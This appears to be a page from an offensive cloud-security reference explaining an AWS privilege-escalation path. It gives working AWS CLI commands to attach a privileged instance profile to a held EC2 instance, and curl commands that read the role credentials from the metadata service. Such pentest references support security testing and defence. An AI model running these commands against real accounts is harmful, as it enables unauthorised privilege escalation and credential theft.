---
title: "AssociateInstanceProfile: attach a privileged profile to an instance you hold"
description: "ec2:AssociateIamInstanceProfile and iam:AddRoleToInstanceProfile to attach a privileged instance profile to an EC2 instance you already control, then read its role credentials from the metadata service."
keywords:
  - AssociateIamInstanceProfile
  - AddRoleToInstanceProfile
  - instance profile
  - EC2
  - IMDS
  - privilege escalation
---

# AssociateInstanceProfile

When you already have command execution on an EC2 instance but it carries no useful role, you do not need to launch a new one. With `ec2:AssociateIamInstanceProfile` (and `iam:PassRole` on the profile's role), attach a privileged instance profile to the instance, then read the role credentials from IMDS. If you also hold `iam:AddRoleToInstanceProfile`, you can first swap a privileged role into a profile before associating it. This is distinct from the [EC2 RunInstances path](../pass-role/ec2.md): here the instance already exists and is yours.

## Attach a profile to a running instance

```bash
# if the instance has no profile, associate a privileged one
aws ec2 associate-iam-instance-profile \
  --instance-id i-0123 --iam-instance-profile Name=<privileged-profile>

# or build the profile first by adding a privileged role to it
aws iam create-instance-profile --instance-profile-name p
aws iam add-role-to-instance-profile --instance-profile-name p --role-name <privileged-role>
aws ec2 associate-iam-instance-profile --instance-id i-0123 --iam-instance-profile Name=p
```

## Read the credentials on the box

```bash
TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```

## Exploitation notes

- If the instance already has a profile, use `ec2:ReplaceIamInstanceProfileAssociation` instead of associate.
- Credentials refresh on the instance within a minute or two of association; poll IMDS until the new role appears.
- The role's trust policy must allow `ec2.amazonaws.com`, which every instance-profile role already does.
- See [instance metadata](../../../credentials/instance-metadata/index.md) for the IMDSv2 token flow and SSRF retrieval.

## Tools

- **AWS CLI** (`ec2 associate-iam-instance-profile`, `iam add-role-to-instance-profile`).
- **Pacu** (`iam__privesc_scan`): detects this path in the privesc scan.

## References

- [BishopFox: iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [AWS: AssociateIamInstanceProfile](https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_AssociateIamInstanceProfile.html)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
